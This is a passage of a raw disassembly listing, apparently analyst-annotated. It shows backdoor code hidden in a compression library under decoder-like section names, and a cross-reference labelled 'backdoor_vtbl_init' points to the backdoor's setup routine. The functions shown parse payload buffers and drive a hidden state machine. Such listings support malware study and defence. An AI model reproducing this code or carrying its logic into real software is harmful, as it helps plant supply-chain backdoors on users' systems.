.text.lzip_decoder_memconfia:0000000000008D68                 jmp     loc_848F
.text.lzip_decoder_memconfia:0000000000008D6D ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008D6D
.text.lzip_decoder_memconfia:0000000000008D6D loc_8D6D:                               ; CODE XREF: installed_func_0+6A0↑j
.text.lzip_decoder_memconfia:0000000000008D6D                                         ; installed_func_0+852↑j
.text.lzip_decoder_memconfia:0000000000008D6D                 add     rsp, 0E88h
.text.lzip_decoder_memconfia:0000000000008D74                 pop     rbx
.text.lzip_decoder_memconfia:0000000000008D75                 pop     r12
.text.lzip_decoder_memconfia:0000000000008D77                 pop     r13
.text.lzip_decoder_memconfia:0000000000008D79                 pop     r14
.text.lzip_decoder_memconfia:0000000000008D7B                 pop     r15
.text.lzip_decoder_memconfia:0000000000008D7D                 pop     rbp
.text.lzip_decoder_memconfia:0000000000008D7E                 retn
.text.lzip_decoder_memconfia:0000000000008D7E installed_func_0 endp
.text.lzip_decoder_memconfia:0000000000008D7E
.text.lzip_decoder_memconfia:0000000000008D7E _text_lzip_decoder_memconfia ends
.text.lzip_decoder_memconfia:0000000000008D7E
.text.decode_buffez:0000000000008D80 ; ===========================================================================
.text.decode_buffez:0000000000008D80
.text.decode_buffez:0000000000008D80 ; Segment type: Pure code
.text.decode_buffez:0000000000008D80 ; Segment permissions: Read/Execute
.text.decode_buffez:0000000000008D80 _text_decode_buffez segment para public 'CODE' use64
.text.decode_buffez:0000000000008D80                 assume cs:_text_decode_buffez
.text.decode_buffez:0000000000008D80                 ;org 8D80h
.text.decode_buffez:0000000000008D80                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.decode_buffez:0000000000008D80
.text.decode_buffez:0000000000008D80 ; =============== S U B R O U T I N E =======================================
.text.decode_buffez:0000000000008D80
.text.decode_buffez:0000000000008D80
.text.decode_buffez:0000000000008D80 ; __int64 __fastcall Ldecode_buffer_part_0(__int64, unsigned __int64, __int64)
.text.decode_buffez:0000000000008D80 _Ldecode_buffer_part_0 proc near        ; CODE XREF: _Lfile_info_decode_0+FC↓p
.text.decode_buffez:0000000000008D80
.text.decode_buffez:0000000000008D80 var_90          = qword ptr -90h
.text.decode_buffez:0000000000008D80 var_81          = xmmword ptr -81h
.text.decode_buffez:0000000000008D80 var_71          = xmmword ptr -71h
.text.decode_buffez:0000000000008D80 var_61          = byte ptr -61h
.text.decode_buffez:0000000000008D80
.text.decode_buffez:0000000000008D80                 endbr64
.text.decode_buffez:0000000000008D84                 push    r15
.text.decode_buffez:0000000000008D86                 xorps   xmm0, xmm0
.text.decode_buffez:0000000000008D89                 mov     ecx, 29h ; ')'
.text.decode_buffez:0000000000008D8E                 xor     eax, eax
.text.decode_buffez:0000000000008D90                 push    r14
.text.decode_buffez:0000000000008D92                 push    r13
.text.decode_buffez:0000000000008D94                 push    r12
.text.decode_buffez:0000000000008D96                 push    rbp
.text.decode_buffez:0000000000008D97                 mov     rbp, rdi
.text.decode_buffez:0000000000008D9A                 push    rbx
.text.decode_buffez:0000000000008D9B                 mov     rbx, rdx
.text.decode_buffez:0000000000008D9E                 sub     rsp, 68h
.text.decode_buffez:0000000000008DA2                 lea     rdi, [rsp+98h+var_61]
.text.decode_buffez:0000000000008DA7                 movups  [rsp+98h+var_71], xmm0
.text.decode_buffez:0000000000008DAC                 rep stosb
.text.decode_buffez:0000000000008DAE                 test    rbp, rbp
.text.decode_buffez:0000000000008DB1                 jz      short loc_8DEE
.text.decode_buffez:0000000000008DB3                 test    rdx, rdx
.text.decode_buffez:0000000000008DB6                 jz      loc_8EB6
.text.decode_buffez:0000000000008DBC                 mov     eax, [rdx+104h]
.text.decode_buffez:0000000000008DC2                 cmp     eax, 3
.text.decode_buffez:0000000000008DC5                 jnz     short loc_8DD1
.text.decode_buffez:0000000000008DC7
.text.decode_buffez:0000000000008DC7 loc_8DC7:                               ; CODE XREF: _Ldecode_buffer_part_0+12B↓j
.text.decode_buffez:0000000000008DC7                 mov     eax, 1
.text.decode_buffez:0000000000008DCC                 jmp     loc_8EB8
.text.decode_buffez:0000000000008DD1 ; ---------------------------------------------------------------------------
.text.decode_buffez:0000000000008DD1
.text.decode_buffez:0000000000008DD1 loc_8DD1:                               ; CODE XREF: _Ldecode_buffer_part_0+45↑j
.text.decode_buffez:0000000000008DD1                 mov     r12, rsi
.text.decode_buffez:0000000000008DD4                 cmp     rsi, 12h
.text.decode_buffez:0000000000008DD8                 jbe     short loc_8DDF
.text.decode_buffez:0000000000008DDA                 cmp     eax, 1
.text.decode_buffez:0000000000008DDD                 jbe     short loc_8DF9
.text.decode_buffez:0000000000008DDF
.text.decode_buffez:0000000000008DDF loc_8DDF:                               ; CODE XREF: _Ldecode_buffer_part_0+58↑j
.text.decode_buffez:0000000000008DDF                                         ; _Ldecode_buffer_part_0+77↓j ...
.text.decode_buffez:0000000000008DDF                 mov     dword ptr [rbx+104h], 0FFFFFFFFh
.text.decode_buffez:0000000000008DE9                 jmp     loc_8EB6
.text.decode_buffez:0000000000008DEE ; ---------------------------------------------------------------------------
.text.decode_buffez:0000000000008DEE
.text.decode_buffez:0000000000008DEE loc_8DEE:                               ; CODE XREF: _Ldecode_buffer_part_0+31↑j
.text.decode_buffez:0000000000008DEE                 test    rdx, rdx
.text.decode_buffez:0000000000008DF1                 jz      loc_8EB6
.text.decode_buffez:0000000000008DF7                 jmp     short loc_8DDF
.text.decode_buffez:0000000000008DF9 ; ---------------------------------------------------------------------------
.text.decode_buffez:0000000000008DF9
.text.decode_buffez:0000000000008DF9 loc_8DF9:                               ; CODE XREF: _Ldecode_buffer_part_0+5D↑j
.text.decode_buffez:0000000000008DF9                 movups  xmm1, xmmword ptr [rbp+0]
.text.decode_buffez:0000000000008DFD                 lea     r13, [rsp+98h+var_71]
.text.decode_buffez:0000000000008E02                 mov     rsi, rdx
.text.decode_buffez:0000000000008E05                 mov     rdi, r13
.text.decode_buffez:0000000000008E08                 movups  [rsp+98h+var_81], xmm1
.text.decode_buffez:0000000000008E0D                 call    _Lparse_lzma12_0 ; PIC mode
.text.decode_buffez:0000000000008E12                 test    eax, eax
.text.decode_buffez:0000000000008E14                 jz      short loc_8DDF
.text.decode_buffez:0000000000008E16                 lea     r8, [rbp+10h]
.text.decode_buffez:0000000000008E1A                 lea     r14d, [r12-10h]
.text.decode_buffez:0000000000008E1F                 mov     r9, [rbx+8]
.text.decode_buffez:0000000000008E23                 mov     rdx, r13
.text.decode_buffez:0000000000008E26                 lea     r15, [rsp+98h+var_81]
.text.decode_buffez:0000000000008E2B                 mov     esi, r14d
.text.decode_buffez:0000000000008E2E                 mov     rdi, r8
.text.decode_buffez:0000000000008E31                 mov     [rsp+98h+var_90], r8
.text.decode_buffez:0000000000008E36                 mov     rcx, r15
.text.decode_buffez:0000000000008E39                 call    sub_71C0
.text.decode_buffez:0000000000008E3E                 test    eax, eax
.text.decode_buffez:0000000000008E40                 jz      short loc_8DDF
.text.decode_buffez:0000000000008E42                 movzx   edx, word ptr [rbp+10h]
.text.decode_buffez:0000000000008E46                 sub     r12, 12h
.text.decode_buffez:0000000000008E4A                 cmp     r12, rdx
.text.decode_buffez:0000000000008E4D                 jb      short loc_8DDF
.text.decode_buffez:0000000000008E4F                 mov     rax, [rbx+0E8h]
.text.decode_buffez:0000000000008E56                 mov     rcx, [rbx+0E0h]
.text.decode_buffez:0000000000008E5D                 sub     rcx, rax
.text.decode_buffez:0000000000008E60                 cmp     rdx, rcx
.text.decode_buffez:0000000000008E63                 jnb     loc_8DDF
.text.decode_buffez:0000000000008E69                 add     rax, [rbx+0F0h]
.text.decode_buffez:0000000000008E70                 mov     r8, [rsp+98h+var_90]
.text.decode_buffez:0000000000008E75                 mov     rcx, rax
.text.decode_buffez:0000000000008E78                 xor     eax, eax
.text.decode_buffez:0000000000008E7A
.text.decode_buffez:0000000000008E7A loc_8E7A:                               ; CODE XREF: _Ldecode_buffer_part_0+10B↓j
.text.decode_buffez:0000000000008E7A                 cmp     rdx, rax
.text.decode_buffez:0000000000008E7D                 jz      short loc_8E8D
.text.decode_buffez:0000000000008E7F                 mov     sil, [rbp+rax+12h]
.text.decode_buffez:0000000000008E84                 mov     [rcx+rax], sil
.text.decode_buffez:0000000000008E88                 inc     rax
.text.decode_buffez:0000000000008E8B                 jmp     short loc_8E7A
.text.decode_buffez:0000000000008E8D ; ---------------------------------------------------------------------------
.text.decode_buffez:0000000000008E8D
.text.decode_buffez:0000000000008E8D loc_8E8D:                               ; CODE XREF: _Ldecode_buffer_part_0+FD↑j
.text.decode_buffez:0000000000008E8D                 add     [rbx+0E8h], rdx
.text.decode_buffez:0000000000008E94                 mov     rcx, r15
.text.decode_buffez:0000000000008E97                 mov     rdx, r13
.text.decode_buffez:0000000000008E9A                 mov     esi, r14d
.text.decode_buffez:0000000000008E9D                 mov     r9, [rbx+8]
.text.decode_buffez:0000000000008EA1                 mov     rdi, r8
.text.decode_buffez:0000000000008EA4                 call    sub_71C0
.text.decode_buffez:0000000000008EA9                 test    eax, eax
.text.decode_buffez:0000000000008EAB                 jnz     loc_8DC7
.text.decode_buffez:0000000000008EB1                 jmp     loc_8DDF
.text.decode_buffez:0000000000008EB6 ; ---------------------------------------------------------------------------
.text.decode_buffez:0000000000008EB6
.text.decode_buffez:0000000000008EB6 loc_8EB6:                               ; CODE XREF: _Ldecode_buffer_part_0+36↑j
.text.decode_buffez:0000000000008EB6                                         ; _Ldecode_buffer_part_0+69↑j ...
.text.decode_buffez:0000000000008EB6                 xor     eax, eax
.text.decode_buffez:0000000000008EB8
.text.decode_buffez:0000000000008EB8 loc_8EB8:                               ; CODE XREF: _Ldecode_buffer_part_0+4C↑j
.text.decode_buffez:0000000000008EB8                 add     rsp, 68h
.text.decode_buffez:0000000000008EBC                 pop     rbx
.text.decode_buffez:0000000000008EBD                 pop     rbp
.text.decode_buffez:0000000000008EBE                 pop     r12
.text.decode_buffez:0000000000008EC0                 pop     r13
.text.decode_buffez:0000000000008EC2                 pop     r14
.text.decode_buffez:0000000000008EC4                 pop     r15
.text.decode_buffez:0000000000008EC6                 retn
.text.decode_buffez:0000000000008EC6 _Ldecode_buffer_part_0 endp
.text.decode_buffez:0000000000008EC6
.text.decode_buffez:0000000000008EC6 _text_decode_buffez ends
.text.decode_buffez:0000000000008EC6
.text.file_info_decoda:0000000000008ED0 ; ===========================================================================
.text.file_info_decoda:0000000000008ED0
.text.file_info_decoda:0000000000008ED0 ; Segment type: Pure code
.text.file_info_decoda:0000000000008ED0 ; Segment permissions: Read/Execute
.text.file_info_decoda:0000000000008ED0 _text_file_info_decoda segment para public 'CODE' use64
.text.file_info_decoda:0000000000008ED0                 assume cs:_text_file_info_decoda
.text.file_info_decoda:0000000000008ED0                 ;org 8ED0h
.text.file_info_decoda:0000000000008ED0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.file_info_decoda:0000000000008ED0
.text.file_info_decoda:0000000000008ED0 ; =============== S U B R O U T I N E =======================================
.text.file_info_decoda:0000000000008ED0
.text.file_info_decoda:0000000000008ED0
.text.file_info_decoda:0000000000008ED0 ; __int64 __fastcall Lfile_info_decode_0(__int64, unsigned int, unsigned __int64 *)
.text.file_info_decoda:0000000000008ED0 _Lfile_info_decode_0 proc near          ; DATA XREF: backdoor_vtbl_init+56↑o
.text.file_info_decoda:0000000000008ED0
.text.file_info_decoda:0000000000008ED0 var_154         = dword ptr -154h
.text.file_info_decoda:0000000000008ED0 var_150         = qword ptr -150h
.text.file_info_decoda:0000000000008ED0 var_140         = qword ptr -140h
.text.file_info_decoda:0000000000008ED0 var_131         = xmmword ptr -131h
.text.file_info_decoda:0000000000008ED0 var_121         = byte ptr -121h
.text.file_info_decoda:0000000000008ED0 var_F8          = qword ptr -0F8h
.text.file_info_decoda:0000000000008ED0 var_E0          = qword ptr -0E0h
.text.file_info_decoda:0000000000008ED0 var_AA          = xmmword ptr -0AAh
.text.file_info_decoda:0000000000008ED0 var_9A          = byte ptr -9Ah
.text.file_info_decoda:0000000000008ED0
.text.file_info_decoda:0000000000008ED0                 endbr64
.text.file_info_decoda:0000000000008ED4                 push    r15
.text.file_info_decoda:0000000000008ED6                 push    r14
.text.file_info_decoda:0000000000008ED8                 push    r13
.text.file_info_decoda:0000000000008EDA                 push    r12
.text.file_info_decoda:0000000000008EDC                 push    rbp
.text.file_info_decoda:0000000000008EDD                 push    rbx
.text.file_info_decoda:0000000000008EDE                 sub     rsp, 128h
.text.file_info_decoda:0000000000008EE5                 mov     rbp, cs:global_ctx
.text.file_info_decoda:0000000000008EEC                 mov     [rsp+158h+var_154], esi
.text.file_info_decoda:0000000000008EF0                 mov     [rsp+158h+var_150], rdx
.text.file_info_decoda:0000000000008EF5                 test    rbp, rbp
.text.file_info_decoda:0000000000008EF8                 jz      loc_94AE
.text.file_info_decoda:0000000000008EFE                 mov     rbx, [rbp+10h]
.text.file_info_decoda:0000000000008F02                 test    rbx, rbx
.text.file_info_decoda:0000000000008F05                 jz      loc_94AE
.text.file_info_decoda:0000000000008F0B                 mov     r12, [rbp+20h]
.text.file_info_decoda:0000000000008F0F                 test    r12, r12
.text.file_info_decoda:0000000000008F12                 jz      loc_94AE
.text.file_info_decoda:0000000000008F18                 cmp     qword ptr [rbp+0F0h], 0
.text.file_info_decoda:0000000000008F20                 jz      loc_94AE
.text.file_info_decoda:0000000000008F26                 mov     r14, [r12+48h]
.text.file_info_decoda:0000000000008F2B                 test    r14, r14
.text.file_info_decoda:0000000000008F2E                 jz      loc_94A1
.text.file_info_decoda:0000000000008F34                 cmp     dword ptr [rbp+104h], 4
.text.file_info_decoda:0000000000008F3B                 mov     r13, rdi
.text.file_info_decoda:0000000000008F3E                 jz      loc_947F
.text.file_info_decoda:0000000000008F44                 mov     rdi, rbp
.text.file_info_decoda:0000000000008F47                 call    _Lstream_encoder_mt_init_part_0 ; PIC mode
.text.file_info_decoda:0000000000008F4C                 test    eax, eax
.text.file_info_decoda:0000000000008F4E                 jz      loc_9459
.text.file_info_decoda:0000000000008F54                 mov     eax, [rbp+104h]
.text.file_info_decoda:0000000000008F5A                 cmp     eax, 4
.text.file_info_decoda:0000000000008F5D                 jz      loc_9459
.text.file_info_decoda:0000000000008F63                 inc     eax
.text.file_info_decoda:0000000000008F65                 jz      loc_9459
.text.file_info_decoda:0000000000008F6B                 xor     eax, eax
.text.file_info_decoda:0000000000008F6D                 lea     rdi, [rsp+158h+var_F8]
.text.file_info_decoda:0000000000008F72                 mov     ecx, 12h
.text.file_info_decoda:0000000000008F77                 mov     rsi, rbp
.text.file_info_decoda:0000000000008F7A                 rep stosd
.text.file_info_decoda:0000000000008F7C                 lea     r15, [rsp+158h+var_F8]
.text.file_info_decoda:0000000000008F81                 xor     ecx, ecx
.text.file_info_decoda:0000000000008F83                 mov     rdi, [rsp+158h+var_150]
.text.file_info_decoda:0000000000008F88                 mov     [rsp+158h+var_140], rcx
.text.file_info_decoda:0000000000008F8D                 mov     rdx, r15
.text.file_info_decoda:0000000000008F90                 lea     rcx, [rsp+158h+var_E0]
.text.file_info_decoda:0000000000008F95                 call    _Lstream_decoder_mt_get_progress_0 ; PIC mode
.text.file_info_decoda:0000000000008F9A                 test    eax, eax
.text.file_info_decoda:0000000000008F9C                 jz      loc_947F
.text.file_info_decoda:0000000000008FA2                 mov     rsi, [rsp+158h+var_E0]
.text.file_info_decoda:0000000000008FA7                 lea     rdx, [rsp+158h+var_140]
.text.file_info_decoda:0000000000008FAC                 mov     rcx, rbp
.text.file_info_decoda:0000000000008FAF                 mov     rdi, r15
.text.file_info_decoda:0000000000008FB2                 call    _Lworker_start_0 ; PIC mode
.text.file_info_decoda:0000000000008FB7                 test    eax, eax
.text.file_info_decoda:0000000000008FB9                 jz      loc_947F
.text.file_info_decoda:0000000000008FBF                 mov     rsi, [rsp+158h+var_140]
.text.file_info_decoda:0000000000008FC4                 mov     rdi, [rsp+158h+var_F8]
.text.file_info_decoda:0000000000008FC9                 mov     rdx, rbp
.text.file_info_decoda:0000000000008FCC                 call    _Ldecode_buffer_part_0 ; PIC mode
.text.file_info_decoda:0000000000008FD1                 mov     eax, [rbp+104h]
.text.file_info_decoda:0000000000008FD7                 cmp     eax, 3
.text.file_info_decoda:0000000000008FDA                 jz      loc_9246
.text.file_info_decoda:0000000000008FE0                 jg      short loc_8FF3
.text.file_info_decoda:0000000000008FE2                 test    eax, eax
.text.file_info_decoda:0000000000008FE4                 jz      short loc_9001
.text.file_info_decoda:0000000000008FE6                 dec     eax
.text.file_info_decoda:0000000000008FE8                 jz      loc_9125
.text.file_info_decoda:0000000000008FEE                 jmp     loc_9459
.text.file_info_decoda:0000000000008FF3 ; ---------------------------------------------------------------------------
.text.file_info_decoda:0000000000008FF3
.text.file_info_decoda:0000000000008FF3 loc_8FF3:                               ; CODE XREF: _Lfile_info_decode_0+110↑j
.text.file_info_decoda:0000000000008FF3                 cmp     eax, 4
.text.file_info_decoda:0000000000008FF6                 jz      loc_947F
.text.file_info_decoda:0000000000008FFC                 jmp     loc_9459
.text.file_info_decoda:0000000000009001 ; ---------------------------------------------------------------------------
.text.file_info_decoda:0000000000009001
.text.file_info_decoda:0000000000009001 loc_9001:                               ; CODE XREF: _Lfile_info_decode_0+114↑j
.text.file_info_decoda:0000000000009001                 cmp     qword ptr [rbp+0E8h], 0ADh
.text.file_info_decoda:000000000000900C                 jbe     loc_947F
.text.file_info_decoda:0000000000009012                 xorps   xmm0, xmm0
.text.file_info_decoda:0000000000009015                 lea     rdi, [rsp+158h+var_121]
.text.file_info_decoda:000000000000901A                 mov     ecx, 29h ; ')'
.text.file_info_decoda:000000000000901F                 xor     eax, eax
.text.file_info_decoda:0000000000009021                 rep stosb
.text.file_info_decoda:0000000000009023                 mov     rdx, [rbp+0F0h]
.text.file_info_decoda:000000000000902A                 movups  [rsp+158h+var_131], xmm0
.text.file_info_decoda:000000000000902F                 test    rdx, rdx
.text.file_info_decoda:0000000000009032                 jz      loc_910D
.text.file_info_decoda:0000000000009038                 mov     rcx, [rbp+28h]
.text.file_info_decoda:000000000000903C                 test    rcx, rcx
.text.file_info_decoda:000000000000903F                 jz      loc_910D
.text.file_info_decoda:0000000000009045                 cmp     qword ptr [rcx+8], 0
.text.file_info_decoda:000000000000904A                 jz      loc_910D
.text.file_info_decoda:0000000000009050                 cmp     qword ptr [rbp+0F8h], 0
.text.file_info_decoda:0000000000009058                 jnz     loc_910D
.text.file_info_decoda:000000000000905E                 lea     rdi, [rsp+158h+var_9A]
.text.file_info_decoda:0000000000009066                 mov     ecx, 4Ah ; 'J'
.text.file_info_decoda:000000000000906B                 mov     [rbp+0F8h], rdx
.text.file_info_decoda:0000000000009072                 movups  [rsp+158h+var_AA], xmm0
.text.file_info_decoda:000000000000907A                 rep stosb
.text.file_info_decoda:000000000000907C                 xor     eax, eax
.text.file_info_decoda:000000000000907E
.text.file_info_decoda:000000000000907E loc_907E:                               ; CODE XREF: _Lfile_info_decode_0+1C8↓j
.text.file_info_decoda:000000000000907E                 mov     cl, [rdx+rax+2]
.text.file_info_decoda:0000000000009082                 lea     r15, [rsp+158h+var_AA]
.text.file_info_decoda:000000000000908A                 mov     byte ptr [rsp+rax+158h+var_AA], cl
.text.file_info_decoda:0000000000009091                 inc     rax
.text.file_info_decoda:0000000000009094                 cmp     rax, 3Ah ; ':'
.text.file_info_decoda:0000000000009098                 jnz     short loc_907E
.text.file_info_decoda:000000000000909A                 lea     rbx, [rsp+158h+var_131]
.text.file_info_decoda:000000000000909F                 mov     rsi, rbp
.text.file_info_decoda:00000000000090A2                 mov     rdi, rbx
.text.file_info_decoda:00000000000090A5                 call    _Lparse_lzma12_0 ; PIC mode
.text.file_info_decoda:00000000000090AA                 test    eax, eax
.text.file_info_decoda:00000000000090AC                 jz      short loc_910D
.text.file_info_decoda:00000000000090AE                 mov     rdx, [rbp+28h]
.text.file_info_decoda:00000000000090B2                 mov     ecx, [rbp+100h]
.text.file_info_decoda:00000000000090B8                 mov     rsi, r15
.text.file_info_decoda:00000000000090BB                 mov     r9, rbx
.text.file_info_decoda:00000000000090BE                 mov     rax, [rbp+0F8h]
.text.file_info_decoda:00000000000090C5                 mov     rdx, [rdx+8]
.text.file_info_decoda:00000000000090C9                 lea     r8, [rax+3Ch]
.text.file_info_decoda:00000000000090CD                 mov     rdi, [rdx+rcx*8]
.text.file_info_decoda:00000000000090D1                 push    r12
.text.file_info_decoda:00000000000090D3                 mov     edx, 3Ah ; ':'
.text.file_info_decoda:00000000000090D8                 mov     ecx, 5Ah ; 'Z'
.text.file_info_decoda:00000000000090DD                 push    rbp
.text.file_info_decoda:00000000000090DE                 call    sub_7660
.text.file_info_decoda:00000000000090E3                 pop     r15
.text.file_info_decoda:00000000000090E5                 pop     rdx
.text.file_info_decoda:00000000000090E6                 test    eax, eax
.text.file_info_decoda:00000000000090E8                 jz      short loc_910D
.text.file_info_decoda:00000000000090EA                 mov     dword ptr [rbp+104h], 1
.text.file_info_decoda:00000000000090F4                 xor     eax, eax
.text.file_info_decoda:00000000000090F6                 mov     rdi, rbx
.text.file_info_decoda:00000000000090F9                 mov     ecx, 39h ; '9'
.text.file_info_decoda:00000000000090FE                 rep stosb
.text.file_info_decoda:0000000000009100                 mov     rdi, rbp
.text.file_info_decoda:0000000000009103                 call    _Lstream_encoder_mt_init_part_0 ; PIC mode
.text.file_info_decoda:0000000000009108                 jmp     loc_9315
.text.file_info_decoda:000000000000910D ; ---------------------------------------------------------------------------
.text.file_info_decoda:000000000000910D
.text.file_info_decoda:000000000000910D loc_910D:                               ; CODE XREF: _Lfile_info_decode_0+162↑j
.text.file_info_decoda:000000000000910D                                         ; _Lfile_info_decode_0+16F↑j ...
.text.file_info_decoda:000000000000910D                 mov     dword ptr [rbp+104h], 0FFFFFFFFh
.text.file_info_decoda:0000000000009117                 xor     ebx, ebx
.text.file_info_decoda:0000000000009119                 mov     [rbp+0F8h], rbx
.text.file_info_decoda:0000000000009120                 jmp     loc_9459
.text.file_info_decoda:0000000000009125 ; ---------------------------------------------------------------------------
.text.file_info_decoda:0000000000009125
.text.file_info_decoda:0000000000009125 loc_9125:                               ; CODE XREF: _Lfile_info_decode_0+118↑j
.text.file_info_decoda:0000000000009125                 mov     rax, [rbp+0F8h]
.text.file_info_decoda:000000000000912C                 test    rax, rax
.text.file_info_decoda:000000000000912F                 jz      loc_9459
.text.file_info_decoda:0000000000009135                 movzx   eax, word ptr [rax]
.text.file_info_decoda:0000000000009138                 mov     rdx, [rbp+0E8h]
.text.file_info_decoda:000000000000913F                 cmp     rax, rdx
.text.file_info_decoda:0000000000009142                 jb      loc_9459
.text.file_info_decoda:0000000000009148                 cmp     rdx, rax
.text.file_info_decoda:000000000000914B                 jnz     loc_947F
.text.file_info_decoda:0000000000009151                 mov     rsi, [rbp+0E0h]
.text.file_info_decoda:0000000000009158                 mov     r9, [rbp+98h]
.text.file_info_decoda:000000000000915F                 cmp     rsi, r9
.text.file_info_decoda:0000000000009162                 jb      loc_94A1
.text.file_info_decoda:0000000000009168                 mov     rax, rsi
.text.file_info_decoda:000000000000916B                 sub     rdx, 72h ; 'r'
.text.file_info_decoda:000000000000916F                 sub     rax, r9
.text.file_info_decoda:0000000000009172                 cmp     rdx, rax
.text.file_info_decoda:0000000000009175                 jnb     loc_94A1
.text.file_info_decoda:000000000000917B                 xor     eax, eax
.text.file_info_decoda:000000000000917D                 xorps   xmm0, xmm0
.text.file_info_decoda:0000000000009180                 lea     rdi, [rsp+158h+var_9A]
.text.file_info_decoda:0000000000009188                 mov     ecx, 62h ; 'b'
.text.file_info_decoda:000000000000918D                 movups  [rsp+158h+var_AA], xmm0
.text.file_info_decoda:0000000000009195                 lea     r8, [rsp+158h+var_AA]
.text.file_info_decoda:000000000000919D                 rep stosb
.text.file_info_decoda:000000000000919F                 xor     eax, eax
.text.file_info_decoda:00000000000091A1                 mov     rcx, [rbp+0F0h]
.text.file_info_decoda:00000000000091A8                 add     rcx, rdx
.text.file_info_decoda:00000000000091AB
.text.file_info_decoda:00000000000091AB loc_91AB:                               ; CODE XREF: _Lfile_info_decode_0+2EB↓j
.text.file_info_decoda:00000000000091AB                 mov     dil, [rcx+rax]
.text.file_info_decoda:00000000000091AF                 inc     rax
.text.file_info_decoda:00000000000091B2                 mov     [rax+r8-1], dil
.text.file_info_decoda:00000000000091B7                 cmp     rax, 72h ; 'r'
.text.file_info_decoda:00000000000091BB                 jnz     short loc_91AB
.text.file_info_decoda:00000000000091BD                 cmp     rsi, rdx
.text.file_info_decoda:00000000000091C0                 jb      loc_94A1
.text.file_info_decoda:00000000000091C6                 sub     rsi, rdx
.text.file_info_decoda:00000000000091C9                 xor     eax, eax
.text.file_info_decoda:00000000000091CB                 cmp     rsi, r9
.text.file_info_decoda:00000000000091CE                 jb      loc_94A1
.text.file_info_decoda:00000000000091D4
.text.file_info_decoda:00000000000091D4 loc_91D4:                               ; CODE XREF: _Lfile_info_decode_0+318↓j
.text.file_info_decoda:00000000000091D4                 cmp     r9, rax
.text.file_info_decoda:00000000000091D7                 jz      short loc_91EA
.text.file_info_decoda:00000000000091D9                 mov     sil, [rbp+rax+0A0h]
.text.file_info_decoda:00000000000091E1                 mov     [rcx+rax], sil
.text.file_info_decoda:00000000000091E5                 inc     rax
.text.file_info_decoda:00000000000091E8                 jmp     short loc_91D4
.text.file_info_decoda:00000000000091EA ; ---------------------------------------------------------------------------
.text.file_info_decoda:00000000000091EA
.text.file_info_decoda:00000000000091EA loc_91EA:                               ; CODE XREF: _Lfile_info_decode_0+307↑j
.text.file_info_decoda:00000000000091EA                 mov     rdi, [rbp+28h]
.text.file_info_decoda:00000000000091EE                 mov     r9d, [rbp+100h]
.text.file_info_decoda:00000000000091F5                 mov     rax, [rbp+0F8h]
.text.file_info_decoda:00000000000091FC                 mov     rcx, [rbp+0E0h]
.text.file_info_decoda:0000000000009203                 mov     rdi, [rdi+8]
.text.file_info_decoda:0000000000009207                 mov     rsi, [rbp+0F0h]
.text.file_info_decoda:000000000000920E                 add     rdx, [rbp+98h]
.text.file_info_decoda:0000000000009215                 mov     rdi, [rdi+r9*8]
.text.file_info_decoda:0000000000009219                 push    r9
.text.file_info_decoda:000000000000921B                 lea     r9, [rax+2]
.text.file_info_decoda:000000000000921F                 push    rbp
.text.file_info_decoda:0000000000009220                 call    sub_7660
.text.file_info_decoda:0000000000009225                 pop     r10
.text.file_info_decoda:0000000000009227                 pop     r11
.text.file_info_decoda:0000000000009229                 test    eax, eax
.text.file_info_decoda:000000000000922B                 jnz     short loc_923C
.text.file_info_decoda:000000000000922D                 mov     dword ptr [rbp+104h], 0FFFFFFFFh
.text.file_info_decoda:0000000000009237                 jmp     loc_94A1
.text.file_info_decoda:000000000000923C ; ---------------------------------------------------------------------------
.text.file_info_decoda:000000000000923C
.text.file_info_decoda:000000000000923C loc_923C:                               ; CODE XREF: _Lfile_info_decode_0+35B↑j
.text.file_info_decoda:000000000000923C                 mov     dword ptr [rbp+104h], 3
.text.file_info_decoda:0000000000009246
.text.file_info_decoda:0000000000009246 loc_9246:                               ; CODE XREF: _Lfile_info_decode_0+10A↑j
.text.file_info_decoda:0000000000009246                 mov     r15, [rbp+0F8h]
.text.file_info_decoda:000000000000924D                 test    r15, r15
.text.file_info_decoda:0000000000009250                 jz      loc_9459
.text.file_info_decoda:0000000000009256                 movzx   eax, word ptr [r15]
.text.file_info_decoda:000000000000925A                 mov     cl, [r15+3Bh]
.text.file_info_decoda:000000000000925E                 lea     rsi, [r15+0AEh]
.text.file_info_decoda:0000000000009265                 lea     rdx, [rax-120h]
.text.file_info_decoda:000000000000926C                 cmp     cl, 2
.text.file_info_decoda:000000000000926F                 jz      loc_9322
.text.file_info_decoda:0000000000009275                 cmp     cl, 3
.text.file_info_decoda:0000000000009278                 jz      loc_93F4
.text.file_info_decoda:000000000000927E                 dec     cl
.text.file_info_decoda:0000000000009280                 jnz     loc_9459
.text.file_info_decoda:0000000000009286                 mov     rcx, [rbp+20h]
.text.file_info_decoda:000000000000928A                 cmp     qword ptr [rcx+38h], 0
.text.file_info_decoda:000000000000928F                 jz      loc_9459
.text.file_info_decoda:0000000000009295                 cmp     rdx, 1
.text.file_info_decoda:0000000000009299                 jbe     loc_9459
.text.file_info_decoda:000000000000929F                 mov     dl, [r15+0AEh]
.text.file_info_decoda:00000000000092A6                 mov     [r12+90h], dl
.text.file_info_decoda:00000000000092AE                 mov     dl, [r15+0AFh]
.text.file_info_decoda:00000000000092B5                 mov     [r12+91h], dl
.text.file_info_decoda:00000000000092BD                 movzx   edx, word ptr [r12+90h]
.text.file_info_decoda:00000000000092C6                 test    dx, dx
.text.file_info_decoda:00000000000092C9                 jz      short loc_92ED
.text.file_info_decoda:00000000000092CB                 sub     rax, 122h
.text.file_info_decoda:00000000000092D1                 add     r15, 0B0h
.text.file_info_decoda:00000000000092D8                 cmp     rax, rdx
.text.file_info_decoda:00000000000092DB                 jnb     short loc_92F0
.text.file_info_decoda:00000000000092DD                 mov     word ptr [r12+90h], 0
.text.file_info_decoda:00000000000092E8                 jmp     loc_9459
.text.file_info_decoda:00000000000092ED ; ---------------------------------------------------------------------------
.text.file_info_decoda:00000000000092ED
.text.file_info_decoda:00000000000092ED loc_92ED:                               ; CODE XREF: _Lfile_info_decode_0+3F9↑j
.text.file_info_decoda:00000000000092ED                 xor     r15d, r15d
.text.file_info_decoda:00000000000092F0
.text.file_info_decoda:00000000000092F0 loc_92F0:                               ; CODE XREF: _Lfile_info_decode_0+40B↑j
.text.file_info_decoda:00000000000092F0                 mov     [r12+98h], r15
.text.file_info_decoda:00000000000092F8                 mov     r8, rbp
